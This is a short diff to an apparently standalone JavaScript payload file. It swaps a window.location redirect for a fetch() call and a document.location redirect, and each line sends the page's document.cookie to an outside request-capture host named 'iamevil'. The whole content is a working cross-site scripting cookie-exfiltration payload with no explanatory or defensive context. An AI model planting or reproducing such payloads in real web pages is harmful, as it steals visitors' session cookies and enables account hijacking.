@@ -1,1 +1,2 @@
-window.location='https://iamevil.free.beeceptor.com'+document.cookie;
+fetch('https://iamevil.free.beeceptor.com' + document.cookie);
+document.location='https://iamevil.free.beeceptor.com' + document.cookie;
